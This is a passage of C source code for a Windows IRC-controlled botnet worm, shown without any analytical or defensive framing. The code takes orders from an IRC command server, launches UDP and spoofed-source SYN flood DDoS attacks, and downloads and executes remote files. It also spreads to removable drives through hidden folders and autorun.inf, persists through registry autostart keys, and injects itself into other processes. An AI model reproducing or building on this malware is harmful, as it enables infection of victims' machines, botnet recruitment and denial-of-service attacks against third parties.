		pInj->efs->lstrcpyn(pInj->from, from, sizeof(pInj->from));

		pInj->efs->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pInj->ifs->DL_Thread, injStr, 0, &id);
		return 1;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_ddos_udp].text))
	{
		if (pInj->ddoson == 1)
			return 0;

		pInj->ddoson = 1;
		pInj->dlmode = 0;
		pInj->efs->lstrcpyn(pInj->ddos_ip, word[p + 1], sizeof(pInj->ddos_ip));
		pInj->ddos_port = (unsigned short)batoi(word[p + 2]);
		pInj->ddos_packets = batoi(word[p + 3]);
		pInj->efs->lstrcpyn(pInj->from, from, sizeof(pInj->from));

		pInj->efs->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pInj->ifs->DDOS_Thread, injStr, 0, &id);
		return 1;
	}
	else if (!pInj->efs->lstrcmp(word[p], pInj->strings[s_order_ddos_syn].text))
	{
		if (pInj->ddoson == 1)
			return 0;

		pInj->ddoson = 1;
		pInj->dlmode = 1;
		pInj->efs->lstrcpyn(pInj->ddos_ip, word[p + 1], sizeof(pInj->ddos_ip));
		pInj->ddos_port = (unsigned short)batoi(word[p + 2]);
		pInj->ddos_packets = batoi(word[p + 3]);
		pInj->efs->lstrcpyn(pInj->from, from, sizeof(pInj->from));

		pInj->efs->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pInj->ifs->DDOS_Thread, injStr, 0, &id);
		return 1;
	}
	else
		return 0;
}

_inline char *IRC_IsOrder(LPVOID injStr, char *order)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;

	if (!bstrncmp(order, pInj->strings[s_ircorderprefix].text, pInj->efs->lstrlen(pInj->strings[s_ircorderprefix].text)))
	{
		order += pInj->efs->lstrlen(pInj->strings[s_ircorderprefix].text);
		return order;
	}
	else
		return NULL;
}

_inline int IRC_CheckHost(LPVOID injStr, char *master)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	char	*host;

	host = bstrchr(master, 64);

	if (host == NULL)
		return 0;

	if (!pInj->efs->lstrcmp(host + 1, pInj->strings[s_masterhost].text))
		return 1;
	else
		return 0;
}

_inline int IRC_ParseAllCommands(LPVOID injStr, SOCKET sock, char **word, int i)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	int	 	ret;
	char	*p,
			from[CHANSIZE];

	for (ret = 0; ret < sizeof(from); ret++)
		from[ret] = 0;

	// correction if its channel or user
	if (word[i-1][0] != 35)
	{
		p = bstrchr(word[0], 33);
		*p = 0;
		pInj->efs->lstrcpyn(from, word[0] + 1, sizeof(from));
	}
	else
		pInj->efs->lstrcpyn(from, word[i-1], sizeof(from));

	// remove ":"
	word[i]++;

	do
	{
		if ((word[i] = IRC_IsOrder(injStr, word[i])) != NULL)
		{
			if ((ret = IRC_ParseSingleCommand(injStr, sock, word, i, from)) < 0)
				return ret;
		}
		i++;
		if (i == MAX_WORDS)
			break;
	} while (word[i] != NULL);

	return 0;
}


_inline int IRC_Parse(LPVOID injStr, SOCKET sock, char *line)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	char		*word[MAX_WORDS];
	char		buff[IRCLINE];
	int			i = 0, k, len;

//	pInj->efs->MessageBox(NULL, line, NULL, MB_ICONERROR | MB_OK);

	if (bstrstr(line, pInj->strings[s_motd].text) != NULL)
	{
		pInj->efs->lstrcat(buff, pInj->strings[s_join].text);
		pInj->efs->lstrcat(buff, pInj->strings[s_channel].text);
		if (pInj->strings[s_channelpass].text != NULL)
		{
			pInj->efs->lstrcat(buff, pInj->strings[s_space].text);
			pInj->efs->lstrcat(buff, pInj->strings[s_channelpass].text);
		}
		pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
		pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);
		return 1;
	}

	len = pInj->efs->lstrlen(line);

	for (k = 0; k < MAX_WORDS; k++)
		word[k] = NULL;

	word[0] = line;
	// replace all " " with nulls and save pointers
	for (k = 0; k < len; k++)
	{
		if (line[k] == 32)
		{
			line[k] = 0;
			for (; line[k+1] == 32; k++, line[k] = 0) {}
			i++;
			word[i] = word[0] + k + 1;
			if (word[i][0] == 0)
				word[i] = NULL;
		}
		if ((i + 1) == MAX_WORDS)
		{
			for (; k < len; k++)
			{
				if (line[k] == 32)
					line[k] = 0;
			}
			break;
		}
	}

	for (k = 0; k < sizeof(buff); k++)
		buff[k] = 0;

	if (word[1] == NULL)
		return 0;

	else if (!pInj->efs->lstrcmp(word[0], pInj->strings[s_ping].text))
	{
		pInj->efs->lstrcat(buff, pInj->strings[s_pong].text);
		pInj->efs->lstrcat(buff, word[1]);
		pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
		pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);
		return 1;
	}

	else if (!pInj->efs->lstrcmp(word[1], pInj->strings[s_433].text))
	{
		pInj->efs->lstrcat(buff, pInj->strings[s_nick].text);
		pInj->ifs->GenerateLetters(injStr, pInj->nick, NICKLEN);
		pInj->efs->lstrcat(buff, pInj->nick);
		pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
		pInj->efs->send(sock, buff, pInj->efs->lstrlen(buff), 0);
		return 1;
	}

	else if (word[2] == NULL)
		return 0;

	else if (word[3] == NULL)
		return 0;

	else if (!pInj->efs->lstrcmp(word[1], pInj->strings[s_privmsg].text))
	{
		if (IRC_CheckHost(injStr, word[0]))
		{
			k = 3;
			goto process;
		}
		else
			return 0;
	}

	else if (!pInj->efs->lstrcmp(word[1], pInj->strings[s_332].text))
	{
		k = 4;
		process:
		return IRC_ParseAllCommands(injStr, sock, word, k);
	}

	else
		return 0;
}

_inline int IRC_Listen(LPVOID injStr, SOCKET sock)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	int			len, l;
	char		buffer[MAX_RECEIVE_BUFFER];

	while (sock > 0)
	{
		if (pInj->pending == 2)
			return -5;
		len = 0;
		for (l = 0; l < sizeof(buffer); l++)
			buffer[l] = 0;

		while ((sock) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			l = pInj->efs->recv(sock, buffer + len, 1, 0);
			if (l <= 0)
				return 0;
			len += l;
			if (buffer[len-1] == 13 || buffer[len-1] == 10)
				break;
		}

		if (sock <= 0)
			return 0;
		
		else if (len < 2)
			continue;

		else
		{
			buffer[len-1] = 0;
			if ((l = IRC_Parse(injStr, sock, buffer)) < 0)
				return l;
		}
	}

	return sock;
}

DWORD WINAPI RemoteStartThread(LPVOID injStr)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	WSADATA		WSAdata;
	DWORD		id, d;
	int			i = 0, 
				ret = 1;
	HANDLE		f;
	char		szTemp[MAX_PATH], szTemp2[MAX_PATH];

	// check if removable, then execute shell
	pInj->efs->lstrcpyn(szTemp, pInj->module, 3);
	if (pInj->efs->GetDriveType(szTemp) == DRIVE_REMOVABLE)
		pInj->efs->ShellExecute(NULL, NULL, szTemp, NULL, NULL, SW_SHOWNORMAL);

	if (pInj->efs->WaitForSingleObject(pInj->efs->CreateMutex(NULL, FALSE, pInj->strings[s_mutex].text), 15100) == WAIT_TIMEOUT)
		pInj->efs->ExitThread(0);

	Decode(injStr);

	// create location to copy to
	szTemp[0] = 0;
	pInj->efs->lstrcat(szTemp, pInj->strings[s_c].text);
	pInj->efs->lstrcat(szTemp, pInj->strings[s_usb_recycler].text);
	pInj->efs->CreateDirectory(szTemp, NULL);
	pInj->efs->SetFileAttributes(szTemp, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	pInj->efs->lstrcat(szTemp, pInj->strings[s_usb_recsubdir].text);
	pInj->efs->CreateDirectory(szTemp, NULL);
	pInj->efs->SetFileAttributes(szTemp, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	pInj->efs->lstrcpyn(szTemp2, szTemp, MAX_PATH);
	pInj->efs->lstrcat(szTemp2, pInj->strings[s_usb_desktopini].text);
	f = pInj->efs->CreateFile(szTemp2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (f >= (HANDLE)1)
	{
		pInj->efs->WriteFile(f, pInj->strings[s_usb_desktopinidata].text, pInj->efs->lstrlen(pInj->strings[s_usb_desktopinidata].text), &d, NULL);
	}
	pInj->efs->CloseHandle(f);
	pInj->efs->lstrcat(szTemp, pInj->strings[s_dblslash].text);
	pInj->efs->lstrcat(szTemp, pInj->strings[s_filename].text);

	// different locations, so copy me
	if (pInj->efs->lstrcmpi(pInj->module, szTemp))
	{
		// try to delete file if already exists
		pInj->efs->SetFileAttributes(szTemp, FILE_ATTRIBUTE_NORMAL);
		pInj->efs->DeleteFile(szTemp);

		// copy file
		pInj->efs->CopyFile(pInj->module, szTemp, FALSE);

		// apply attributes
		//pInj->efs->SetFileAttributes(szTemp, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		// save new location as our origin
		pInj->efs->lstrcpyn(pInj->module, szTemp, MAX_PATH);
	}

	// protect our exe file
	f = pInj->efs->CreateFile(pInj->module, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, 0); 

	pInj->efs->Sleep(STARTWAITTIME);

	// start reg thread
	pInj->efs->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pInj->ifs->REG_Thread, injStr, 0, &id);

	if (pInj->efs->WSAStartup(MAKEWORD(2, 2), &WSAdata) != 0) 
	{
		pInj->efs->CloseHandle(f);
		pInj->efs->ExitThread(0);
	}

	// start usb spread thread
	pInj->efs->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pInj->ifs->USB_Thread, injStr, 0, &id);

	bsrand(&pInj->holdrand, pInj->efs->GetTickCount());

	while (1)
	{
		if (pInj->condata[i].host == NULL)
		{
			i = 0;
		}
		if ((pInj->ircsock = IRC_Connect(injStr, pInj->condata[i].host, pInj->condata[i].port)) > 0)
		{
			i = 0;
			pInj->silent = '0';
			pInj->ifs->GenerateLetters(injStr, pInj->nick, NICKLEN);
			pInj->ifs->GenerateLetters(injStr, pInj->user, NICKLEN);
			pInj->ifs->GenerateLetters(injStr, pInj->mid, MIDLEN);
			if (IRC_Login(injStr, pInj->ircsock) > 0)
			{
				ret = IRC_Listen(injStr, pInj->ircsock);

				if (ret == -3)
					i++;
				else if (ret == -4)
				{
					pInj->efs->closesocket(pInj->ircsock);
					break;
				}
				else if (ret == -5)
				{
					pInj->efs->closesocket(pInj->ircsock);
					break;
				}

				pInj->efs->closesocket(pInj->ircsock);
			}
		}
		else
		{
			i++;
		}

		pInj->efs->Sleep(RECONNECTSLEEP);
	}

	pInj->efs->CloseHandle(f);

	if (ret == -5)
	{
		pInj->pending = 2;
		pInj->efs->SetFileAttributes(pInj->module, FILE_ATTRIBUTE_NORMAL);
		pInj->efs->DeleteFile(pInj->module);
	}
	else
		pInj->pending = 1;

	pInj->efs->ExitThread(0);
	return 0;
}

static void __declspec() ProcEnd_StartThread() {}

_inline void *bmemset(void *p, int c, size_t n)
{
  char *pb = (char *) p;
  char *pbend = pb + n;
  while (pb != pbend) *pb++ = c;
  return p;
}

DWORD WINAPI RemoteDownloadThread(LPVOID injStr)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;

	HINTERNET hOpen, hURL;
	char data[IRCLINE];
	DWORD read, d;
	HANDLE f;
	BOOL action = FALSE;
	PROCESS_INFORMATION		pInfo;
	STARTUPINFO				sInfo;
	bmemset(&sInfo, 0, sizeof(sInfo));
	bmemset(&pInfo, 0, sizeof(pInfo));
	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.dwFlags = STARTF_USESHOWWINDOW;
	sInfo.wShowWindow = SW_SHOW;

	hOpen = pInj->efs->InternetOpen(pInj->strings[s_internetopen].text, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hOpen == NULL)
	{
		goto end;
	}

	hURL = pInj->efs->InternetOpenUrl(hOpen, pInj->dlurl, NULL, 0, 0, 0);
	if (hURL == NULL)
	{
		goto end;
	}

	f = pInj->efs->CreateFile(pInj->dlfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f < (HANDLE)1) 
	{
		pInj->efs->InternetCloseHandle(hURL);
		goto end;
	}

	while (pInj->efs->InternetReadFile(hURL, data, sizeof(data) - 1 , &read) && read != 0)
	{
		pInj->efs->WriteFile(f, data, read, &d, NULL);
	}

	pInj->efs->InternetCloseHandle(hURL);
	pInj->efs->CloseHandle(f);

	if (pInj->dlmode == '1' || pInj->dlmode == '2')
	{
		if ((action = pInj->efs->CreateProcess(NULL, pInj->dlfile, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo)) &&
			pInj->dlmode == '2')
			pInj->pending = 2;
	}
	else
		action = TRUE;

end:
	pInj->efs->lstrcat(data, pInj->strings[s_privmsg].text);
	pInj->efs->lstrcat(data, pInj->strings[s_space].text);
	pInj->efs->lstrcat(data, pInj->from);
	pInj->efs->lstrcat(data, pInj->strings[s_dbldot].text);
	if (action)
		pInj->efs->lstrcat(data, pInj->strings[s_success].text);
	else
		pInj->efs->lstrcat(data, pInj->strings[s_failed].text);
	pInj->efs->lstrcat(data, pInj->strings[s_newline].text);
	if (pInj->silent == '0')
		pInj->efs->send(pInj->ircsock, data, pInj->efs->lstrlen(data), 0);

	pInj->efs->ExitThread(0);
	return 0;
}

static void __declspec() ProcEnd_DownloadThread() {}

_inline BOOL USB_InfectDrive(LPVOID injStr, char *drv)
{	
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	char	szFile[IRCLINE], szTemp[IRCLINE], *p;
	int		i;
	BOOL	ret;
	HANDLE	f;
	DWORD	d;

	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;

	// create RECYCLER
	pInj->efs->lstrcat(szFile, drv);
	pInj->efs->lstrcat(szFile, pInj->strings[s_usb_recycler].text);
	if (!pInj->efs->CreateDirectory(szFile, NULL) && pInj->efs->GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	pInj->efs->SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	// create RECYCLER sub-dir
	pInj->efs->lstrcat(szFile, pInj->strings[s_usb_recsubdir].text);
	if (!pInj->efs->CreateDirectory(szFile, NULL) && pInj->efs->GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	pInj->efs->SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	// create Desktop.ini
	pInj->efs->lstrcat(szTemp, pInj->strings[s_usb_desktopinidata].text);
	pInj->efs->lstrcat(szFile, pInj->strings[s_usb_desktopini].text);	
	f = pInj->efs->CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (f < (HANDLE)1) 
		return FALSE;
	if (!pInj->efs->WriteFile(f, pInj->strings[s_usb_desktopinidata].text, pInj->efs->lstrlen(pInj->strings[s_usb_desktopinidata].text), &d, NULL))
	{
		pInj->efs->CloseHandle(f);
		return FALSE;
	}
	pInj->efs->CloseHandle(f);

	// copy .exe file
	p = szFile + pInj->efs->lstrlen(szFile);
	while (p[0] != '\\')
		p--;
	p++;
	*p = 0;
	pInj->efs->lstrcat(szFile, pInj->strings[s_filename].text);
	ret = pInj->efs->CopyFile(pInj->module, szFile, TRUE);
	// todo: add crc or md5 check for file
	pInj->efs->SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	
	// create autorun.inf data
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;
	p = szFile;
	while (p[0] != '\\')
		p++;
	p++;
	pInj->efs->lstrcat(szTemp, pInj->strings[s_usb_autorundata1].text);
	pInj->efs->lstrcat(szTemp, p);
	pInj->efs->lstrcat(szTemp, pInj->strings[s_usb_autorundata2].text);
	pInj->efs->lstrcat(szTemp, p);
	pInj->efs->lstrcat(szTemp, pInj->strings[s_usb_autorundata3].text);

	// create autorun.inf file
	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	pInj->efs->lstrcat(szFile, drv);
	pInj->efs->lstrcat(szFile, pInj->strings[s_usb_autoruninf].text);
	pInj->efs->SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	f = pInj->efs->CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);
	if (f < (HANDLE)1)
		return FALSE;
	if (!pInj->efs->WriteFile(f, szTemp, pInj->efs->lstrlen(szTemp), &d, NULL))
	{
		pInj->efs->CloseHandle(f);
		return FALSE;
	}

	pInj->efs->CloseHandle(f);
	return ret;
}

DWORD WINAPI RemoteUSBThread(LPVOID injStr)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
    char		szTemp[IRCLINE], buff[IRCLINE];
	char 		szDrive[3];
	char		*p;
	int			i;

	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;

	szDrive[0] = 0;
	pInj->efs->lstrcpyn(szDrive, pInj->strings[s_dbldot].text, sizeof(szDrive));
	
	for (;;)
	{
		pInj->efs->Sleep(USBSLEEPTIME);

		if (pInj->pending > 0)
			pInj->efs->ExitThread(0);

    	if (pInj->efs->GetLogicalDriveStrings(IRCLINE - 1, szTemp)) 
    	{
        	p = szTemp;
	
        	do
        	{
				*szDrive = *p;

				if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)
				{
					if (pInj->efs->GetDriveType(szDrive) == DRIVE_REMOVABLE)
					{
						if (USB_InfectDrive(injStr, szDrive) && pInj->ircsock > 0)
						{
							for (i = 0; i < sizeof(buff); i++)
								buff[i] = 0;

							pInj->efs->lstrcat(buff, pInj->strings[s_privmsg].text);
							pInj->efs->lstrcat(buff, pInj->strings[s_space].text);
							pInj->efs->lstrcat(buff, pInj->strings[s_channel_usb].text);
							pInj->efs->lstrcat(buff, pInj->strings[s_dbldot].text);
							pInj->efs->lstrcat(buff, pInj->strings[s_usb_infect].text);
							pInj->efs->lstrcat(buff, szDrive);
							pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
							if (pInj->silent == '0')
								pInj->efs->send(pInj->ircsock, buff, pInj->efs->lstrlen(buff), 0);
						}
					}
				}

           		while (*p++);

			} while (*p);
		}
	}
}

static void __declspec() ProcEnd_USBThread() {}


DWORD WINAPI RemoteREGThread(LPVOID injStr)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	HKEY		reg;
	char		szTemp[256];

	for (;;)
	{
		szTemp[0] = 0;
		pInj->efs->lstrcat(szTemp, pInj->strings[s_autostartreg].text);
		pInj->efs->lstrcat(szTemp, pInj->strings[s_dblslash].text);
		pInj->efs->lstrcat(szTemp, pInj->strings[s_autostartkey].text);

		if (pInj->efs->RegCreateKeyEx(HKEY_LOCAL_MACHINE, szTemp, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL) == ERROR_SUCCESS)
		{
			pInj->efs->RegSetValueEx(reg, pInj->strings[s_stubpath].text, 0, REG_SZ, (const unsigned char *)pInj->module, pInj->efs->lstrlen(pInj->module));
			pInj->efs->RegCloseKey(reg);

			pInj->efs->RegCreateKeyEx(HKEY_CURRENT_USER, pInj->strings[s_autostartreg].text, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			pInj->efs->RegDeleteKey(reg, pInj->strings[s_autostartkey].text);
			pInj->efs->RegCloseKey(reg);

			if (pInj->pending > 0)
			{
				if (pInj->pending == 2)
				{
					pInj->efs->RegCreateKeyEx(HKEY_LOCAL_MACHINE, pInj->strings[s_autostartreg].text, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
					pInj->efs->RegDeleteKey(reg, pInj->strings[s_autostartkey].text);
					pInj->efs->RegCloseKey(reg);
				}
				pInj->efs->ExitThread(0);
			}
		}
		else
		{
			pInj->efs->RegCreateKeyEx(HKEY_CURRENT_USER, pInj->strings[s_autostartreg_guestacc].text, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			pInj->efs->RegSetValueEx(reg, pInj->strings[s_autostartreg_def].text, 0, REG_SZ, (const unsigned char *)pInj->module, pInj->efs->lstrlen(pInj->module));
			pInj->efs->RegCloseKey(reg);

			if (pInj->pending > 0)
			{
				if (pInj->pending == 2)
				{
					pInj->efs->RegCreateKeyEx(HKEY_CURRENT_USER, pInj->strings[s_autostartreg_guestacc].text, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
					pInj->efs->RegDeleteValue(reg, pInj->strings[s_autostartreg_def].text);
					pInj->efs->RegCloseKey(reg);
				}
				pInj->efs->ExitThread(0);
			}
		}

		pInj->efs->Sleep(REGSLEEPTIME);
	}
}

static void __declspec() ProcEnd_REGThread() {}


_inline void *bmemcpy(void *dst, const void *src, size_t n)
{
  void *ret = dst;

  while (n--)
  {
    *(char *)dst = *(char *)src;
    dst = (char *) dst + 1;
    src = (char *) src + 1;
  }

  return ret;
}

_inline USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }

    if (size)
        cksum += *(UCHAR*)buffer;   

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

DWORD WINAPI RemoteDDOSThread(LPVOID injStr)
{
	PINJECT_STRUCT	pInj = (PINJECT_STRUCT)injStr;
	char			buff[1024];
	int				i;
	SOCKET			sock;
	struct			sockaddr_in sin;
	IPHEADER		ipHeader; 
	TCPHEADER		tcpHeader; 
	PSDHEADER		psdHeader;
	unsigned int	SpoofingIP = pInj->efs->inet_addr(pInj->ddos_ip);
	char			szSendBuf[60];
	BOOL			flag = TRUE;

	buff[0] = 0;
	pInj->efs->lstrcat(buff, pInj->strings[s_privmsg].text);
	pInj->efs->lstrcat(buff, pInj->strings[s_space].text);
	pInj->efs->lstrcat(buff, pInj->from);
	pInj->efs->lstrcat(buff, pInj->strings[s_dbldot].text);
	pInj->efs->lstrcat(buff, pInj->strings[s_ddos_start].text);
	pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
	if (pInj->silent == '0')
		pInj->efs->send(pInj->ircsock, buff, pInj->efs->lstrlen(buff), 0);

	if (pInj->dlmode == 0)
		sock = pInj->efs->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	else
		sock = pInj->efs->WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
	if (sock == INVALID_SOCKET)
	{
		goto err;
	}

	sin.sin_addr.s_addr = pInj->efs->inet_addr(pInj->ddos_ip);
	sin.sin_family = AF_INET;
	sin.sin_port = pInj->efs->htons(pInj->ddos_port);

	if (pInj->dlmode == 1)
	{
		pInj->efs->setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag));

		ipHeader.verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
		ipHeader.total_len=pInj->efs->htons(sizeof(ipHeader)+sizeof(tcpHeader));
		ipHeader.ident=1;
		ipHeader.frag_and_flags=0;
		ipHeader.ttl=128;
		ipHeader.proto=IPPROTO_TCP;
		ipHeader.checksum=0;
		ipHeader.destIP=pInj->efs->inet_addr(pInj->ddos_ip);

		tcpHeader.dport=pInj->efs->htons((unsigned short)pInj->ddos_port);
		tcpHeader.sport=pInj->efs->htons((unsigned short)800);
		tcpHeader.seq=pInj->efs->htonl(0x12345678);

		tcpHeader.ack_seq=0;
		tcpHeader.flags=SYN;
		
		tcpHeader.lenres=(sizeof(tcpHeader)/4<<4|0); 
		tcpHeader.window=pInj->efs->htons(16384); 
		tcpHeader.urg_ptr=0;

		for (i = 0; i < sizeof(szSendBuf); i++)
			szSendBuf[i] = 0;
	}

	while (pInj->ddoson == 1)
	{
		if (pInj->dlmode == 0)
		{
			pInj->ifs->GenerateLetters(pInj, buff, sizeof(buff) - 1);

			pInj->efs->sendto(sock, buff, sizeof(buff), 0, (struct sockaddr *)&sin, sizeof(sin));
		}
		else
		{
			tcpHeader.checksum=0; 
			tcpHeader.sport=pInj->efs->htons((unsigned short)800);
			tcpHeader.seq=pInj->efs->htons((unsigned short)1);

			ipHeader.sourceIP=pInj->efs->htonl(SpoofingIP++);

			psdHeader.daddr=ipHeader.destIP; 
			psdHeader.zero=0; 
			psdHeader.proto=IPPROTO_TCP; 
			psdHeader.length=pInj->efs->htons(sizeof(tcpHeader));
			psdHeader.saddr=ipHeader.sourceIP; 
			bmemcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
			bmemcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
			
			tcpHeader.checksum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
 
			bmemcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
			bmemcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
			szSendBuf[sizeof(ipHeader) + sizeof(tcpHeader)] = 0;
			szSendBuf[sizeof(ipHeader) + sizeof(tcpHeader) + 1] = 0;
			szSendBuf[sizeof(ipHeader) + sizeof(tcpHeader) + 2] = 0;
			szSendBuf[sizeof(ipHeader) + sizeof(tcpHeader) + 3] = 0;
			ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 

			bmemcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 

			if (pInj->efs->sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
				break;
		}

		if (pInj->ddos_packets > 0)
		{
			i++;
			if (pInj->ddos_packets == i)
				break;
		}

		pInj->efs->Sleep(1);
	}

err:
	pInj->efs->closesocket(sock);
	pInj->ddoson = 0;

	buff[0] = 0;
	pInj->efs->lstrcat(buff, pInj->strings[s_privmsg].text);
	pInj->efs->lstrcat(buff, pInj->strings[s_space].text);
	pInj->efs->lstrcat(buff, pInj->from);
	pInj->efs->lstrcat(buff, pInj->strings[s_dbldot].text);
	pInj->efs->lstrcat(buff, pInj->strings[s_ddos_end].text);
	pInj->efs->lstrcat(buff, pInj->strings[s_newline].text);
	if (pInj->silent == '0')
		pInj->efs->send(pInj->ircsock, buff, pInj->efs->lstrlen(buff), 0);

	pInj->efs->ExitThread(0);
	return 0;
}

static void __declspec() ProcEnd_DDOSThread() {}

void GenerateLetters(LPVOID injStr, char *str, unsigned int len)
{
	PINJECT_STRUCT pInj = (PINJECT_STRUCT)injStr;
	unsigned int	i;

	for (i = 0; i <= len; i++)
		str[i] = (brand(&pInj->holdrand)%26) + 97;

	str[len] = 0;

	return;
}

static void __declspec() ProcEnd_GenerateLetters() {}


BOOL AdjustPrivileges(char *pPriv)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return bRet;

	if (!LookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) 
	{
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1; 
	tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;

	bRet = AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);
	
	CloseHandle(hToken);

	return bRet;
} //	AdjustPrivileges(SE_DEBUG_NAME);


void DecodeAPIStrings(char *key)
{
	int i, j, k;

	for (k = 0; apistr[k] != NULL; k++)
	{
		for (i = 0; i < lstrlen(apistr[k]); i++)
		{
			for (j = 0; j < lstrlen(key); j++)
				apistr[k][i] ^= key[j];

			apistr[k][i] = ~ apistr[k][i];
		}
	}

	return;
}


int WinMainCRTStartup()	
{
	DWORD		dwProcSize, dwWr;
	INJECT_STRUCT 	injStr;
	ext_functions_s efs;
	int_functions_s ifs;
	HANDLE		hProc;
#ifdef DEBUG
	HMODULE		user32_dll;
#endif
	HMODULE 	kernel32_dll, ws2_32_dll, wininet_dll, shell32_dll, advapi32_dll, ntdll_dll;
	LPVOID		pAddr, pStrAddr, pStrAddr_str, pStrAddr_efs, pStrAddr_ifs, pStrAddr_con;
	DWORD thread_id;
	HANDLE		remote_thread;
	int			i;
	HANDLE			hProcess;
	PROCESSENTRY32	pe32 = {0};

	// functions
	CT32S fCreateToolhelp32Snapshot;
	P32F fProcess32First;
	P32N fProcess32Next;
	OP fOpenProcess;
	GMFN fGetModuleFileName;
	VAE fVirtualAllocEx;
	CRT fCreateRemoteThread;
	ZwWVM ZwWriteVirtualMemory;

#ifdef DEBUG
